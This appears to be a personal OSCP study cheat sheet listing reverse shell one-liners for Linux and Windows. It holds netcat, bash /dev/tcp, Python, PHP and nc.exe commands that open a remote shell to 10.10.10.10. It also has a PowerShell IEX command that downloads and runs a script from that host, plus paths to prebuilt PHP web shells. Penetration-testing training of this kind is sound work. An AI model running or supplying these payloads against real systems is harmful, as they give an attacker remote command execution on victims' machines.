# OSCP Reverse Shell Cheat Sheet
Created by mr-b4rt0wsk1 on 06/30/2020

## LINUX

### nc

Used older versions of nc.  If you find yourself needing another shell (like for priv esc/root), the second one is used to not overwrite the first:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f`

`rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.10.10 5555 >/tmp/g`

For some command injections:

`rm -f /tmp/x; mkfifo /tmp/x; /bin/sh -c "cat /tmp/x | /bin/sh -i 2>&1 | nc 10.10.10.10 80 > /tmp/x"`

The -e options is only valid for some versions of nc:

`nc -e /bin/sh 10.10.10.10 4444`

If you need no slashes:

`nc 10.10.10.10 4444 -c bash`

### Bash

`bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`

### Python

One-liner:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

To use as a file:

```python
#!/usr/bin/python
import socket,subprocess,os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
```

### PHP

Assumes that the TCP connection uses the file descriptor 3.  If it doesn't work, try 4, 5, 6 ...

`php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

If you need a `.php` file, check:
* `/opt/php-reverse-shell-1.0/php-reverse-shell.php`
    * This is where I installed it
* `/usr/share/laudanum/php/php-reverse-shell.php`
    * This is where it can be found on Kali distros
* `/usr/share/webshells/php/php-reverse-shell.php`
    * Also where it can be found Kali distros
* Use `locate php-reverse-shell.php` to find more, if needed

## WINDOWS

### nc

`nc.exe 10.10.10.10 4444 -e cmd.exe`

This binary should be located at `/usr/share/windows-resources/binaries/nc.exe`

You can run `locate nc.exe` to find the path if it differs

### PowerShell
`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')`

You will need to edit the script to call itself using our IP address and port, as seen in ippsec's video for Optimum HTB. Then serve up the file, probably via a python webserver.

## Resources
* pentestmonkey [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* PayloadsAllTheThings [repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* nishang [repo](https://github.com/samratashok/nishang)
* msfvenom [cheat sheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)
* ippsec's Optimum HTB [video](https://www.youtube.com/watch?v=kWTnVBIpNsE&ab_channel=IppSec)